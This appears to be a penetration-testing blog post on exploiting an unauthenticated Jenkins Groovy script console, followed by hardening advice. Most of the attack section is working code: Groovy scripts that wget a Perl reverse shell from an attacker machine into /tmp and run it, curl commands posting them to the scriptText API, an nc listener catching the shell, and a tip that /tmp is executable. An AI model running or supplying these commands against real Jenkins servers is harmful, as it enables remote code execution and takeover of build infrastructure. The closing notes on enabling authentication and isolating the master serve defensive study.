## Description:

[Jenkins](https://jenkins-ci.org/) (continuous intergration server) default install allows for unauthenticated access to the API on the Jenkins Master Server (default behavour). Allowing unauthenticated access to the groovy script console, allowing an attacker to execute shell commands and / or connect back with a reverse shell.

## Instructions

This is really basic, I made a few small groovy scripts to execute the shell commands I wanted via Jenkins API (I recall having some issues runing more than one command at a time via groovy), I then executed them using Curl.

### groovy script wget shell

Script to wget perl reverse shell to target and copy it to /tmp/shell.

{% highlight java %}
   def command = "wget http://192.168.145.128/perl-reverse-shell.pl -O /tmp/shell"
   def proc = command.execute()
   proc.waitFor()

   println "Process exit code: ${proc.exitValue()}"
   println "Std Err: ${proc.err.text}"
   println "Std Out: ${proc.in.text}"
{% endhighlight %}

<div class="note tip">
  <h5>Jenkins requires /tmp to have exec perms</h5>
  <p>By default Jenkins requires <code>/tmp</code> to have the execute mount option set, so you should be safe to land shells there on Jenkins servers.</p>
</div>


### groovy script execute shell command

{% highlight java %}
    def command = "perl /tmp/shell"
    def proc = command.execute()
    proc.waitFor()              

    println "Process exit code: ${proc.exitValue()}"
    println "Std Err: ${proc.err.text}"
    println "Std Out: ${proc.in.text}"
{% endhighlight %}

### Execute the Groovy Scripts via scriptText Jenkins API

{% highlight bash %}
curl -d "script=$(<./wget.groovy)" -X POST http://192.168.30.130:8080/scriptText
curl --data-urlencode  "script=$(<./execute.groovy)" -X POST http://192.168.30.130:8080/scriptText
{% endhighlight %}

### Get Shell

{% highlight bash %}
    [root:~/pwn-jenkins]# nc -v -n -l -p 443
    listening on [any] 443 ...
    connect to [192.168.30.128] from (UNKNOWN) [192.168.30.130] 42340

<div class="note info">
  <h5>Jenkins Does Not Consider this a Vulnerability</h5>
  <p>Dispite the fact the web application is insecure by default (the default
  install leaves the API and webapp exposed without authentication), Jenkins do
  not consider this a vulnerability. Your best option is to configure
  authentication by following the <a href="https://wiki.jenkins-ci.org/display/JENKINS/Standard+Security+Setup">Securing Jenkinsi Guide</a></p>
</div>

## More info about Jenkins

Jenkins is a tool consisting of a master and a slave, the master server
schedules and runs jobs for the jenkins slaves to execute. The default
installation configures the master as a slave server, allowing anyone with access to the Jenkins master
to execute arbitrary code on the master (via the slave).

A more secure solution would be isolating the role of the master server.
Currently if a Jenkins master server is compromised, it's likely an attacker
will also be able to execute jobs / run shell scripts on the Jenkins slaves.

An additional ACL option within Matrix-based security to disable API, and
another for script
console / execution on the Jenkins Master would be a good idea. Currently the
only options is to disable all script access for the user/group, which appears to include the
slaves.

Be mindful of the fact that, by giving access to the slaves via the Jenkins Master,
you're essentially giving the user shell level access to the slave (or at least
the ability to execute shell commands on the slave machine).
